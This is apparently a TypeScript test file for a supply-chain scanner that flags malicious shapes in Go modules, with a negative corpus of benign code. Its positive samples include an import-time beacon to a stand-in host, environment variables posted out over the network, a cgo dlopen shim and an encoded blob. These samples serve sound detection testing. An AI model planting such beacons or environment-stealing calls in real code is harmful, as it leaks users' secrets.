/**
 * The local content scanner (M10, PLAN-ZERO-DAY P1).
 *
 * Positive corpus: the lazy/templated malware shapes real incidents are made
 * of. Negative corpus: ordinary code that must never trip a rule — a scanner
 * that cries wolf trains the human to approve anyway, which is worse than no
 * scanner.
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { isPrivateModule, scanModuleSource } from "../../src/analyzers/content.ts";

const tempRoots: string[] = [];

after(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
});

async function moduleWith(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "supplyguard-content-"));
  tempRoots.push(root);
  for (const [name, body] of Object.entries(files)) {
    await mkdir(join(root, name, ".."), { recursive: true });
    await writeFile(join(root, name), body);
  }
  return root;
}

function rules(findings: readonly { rule: string }[]): string[] {
  return findings.map((f) => f.rule);
}

test("import-time egress and execution are flagged with file and line", async () => {
  const root = await moduleWith({
    "beacon.go": [
      "package evil",
      "",
      "func init() {",
      "  http.Get(\"https://collector.example/ping\")",
      "}",
      "",
      "var _ = http.Get",
    ].join("\n"),
  });
  const findings = await scanModuleSource(root);
  assert.deepEqual(rules(findings), ["content:init-egress"]);
  assert.equal(findings[0]?.file, "beacon.go");
  assert.equal(findings[0]?.line, 4);
});

test("environment harvesting beside a network call is flagged", async () => {
  const root = await moduleWith({
    "steal.go": [
      "package evil",
      "",
      "func report() {",
      "  payload := os.Environ()",
      "  http.Post(\"https://x\", \"text\", body(payload))",
      "}",
    ].join("\n"),
  });
  assert.deepEqual(rules(await scanModuleSource(root)), ["content:env-egress"]);
});

test("encoded payloads, cgo dlopen and generate directives are flagged", async () => {
  const blob = "A".repeat(600);
  const root = await moduleWith({
    "payload.go": `package evil\n\nvar blob = "${blob}"\n`,
    "shim.go": [
      "package evil",
      "",
      "/*",
      "#include <dlfcn.h>",
      "void* l() { return dlopen(\"x.so\", 2); }",
      "*/",
      "import \"C\"",
    ].join("\n"),
    "gen.go": "//go:generate go run golang.org/x/tools/cmd/stringer@latest\npackage evil\n",
  });
  assert.deepEqual(rules(await scanModuleSource(root)).sort(), [
    "content:cgo-dlopen",
    "content:encoded-blob",
    "content:generate-directive",
  ]);
});

// NEGATIVE CORPUS: ordinary code must stay free, or the banner means nothing.
test("ordinary code is not flagged", async () => {
  const root = await moduleWith({
    "handler.go": [
      "package api",
      "",
      "func Handler() {",
      "  http.Get(\"https://api.example/health\")",
      "}",
    ].join("\n"),
    "config.go": [
      "package api",
      "",
      "var mode = os.Getenv(\"MODE\")",
      "var small = \"c2VjcmV0\"",
    ].join("\n"),
    "init.go": ["package api", "", "func init() {", "  registerRoutes()", "}"].join("\n"),
  });
  assert.deepEqual(await scanModuleSource(root), []);
});

test("GOPRIVATE patterns decide what never leaves the machine", () => {
  assert.equal(isPrivateModule("github.com/mycorp/secret", { GOPRIVATE: "github.com/mycorp/*" }), true);
  assert.equal(isPrivateModule("github.com/other/thing", { GOPRIVATE: "github.com/mycorp/*" }), false);
  assert.equal(isPrivateModule("example.com/x", { GONOPROXY: "example.com" }), true);
  assert.equal(isPrivateModule("example.com/x", {}), false);
});
